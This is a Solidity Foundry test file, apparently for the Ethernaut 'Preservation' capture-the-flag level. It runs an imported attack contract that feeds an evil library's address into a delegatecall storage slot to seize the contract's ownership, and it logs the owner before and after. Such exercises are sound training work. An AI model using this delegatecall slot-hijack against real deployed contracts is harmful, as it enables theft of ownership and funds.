import "forge-std/Test.sol";
import "../src/PreservaltionAttack.sol";
import {console2} from "forge-std/Script.sol";

contract PreservationTest is Test {
    Preservation preservation;
    LibraryContract libraryContract;
    EvilLibraryContractImpl evilImpl;
    PreservationAttack preservationAttack;
    address alice = makeAddr("alice"); // детерминированный тест-адрес

    function setUp() public { 
        vm.deal(alice, 10 ether);       // выдать alice ETH
   
        evilImpl = new EvilLibraryContractImpl();
        libraryContract = new LibraryContract();
        preservation = new Preservation(address(libraryContract), address(libraryContract));
        preservationAttack = new PreservationAttack(address(preservation));
        //Attack is called from constructor so there is no need for any further tests
    }

    function testChangeOwner() public {
        vm.prank(alice);
        console.log("my address:");
        console.logAddress(alice);
        console.log("old owner address:");
        console.logAddress(address(preservation.owner()));
        console.log("lib address:");
        console.logAddress(address(libraryContract));
          console.log("evillib address:");
        console.logAddress(address(evilImpl));

        preservationAttack.attack(uint256(uint160(address(evilImpl))), alice);
        console.log("used lib1 address:");
        console.logAddress(address(preservation.timeZone1Library()));


        console2.log("changed owner address:");
        console2.logAddress(address(preservation.owner()));

    }
}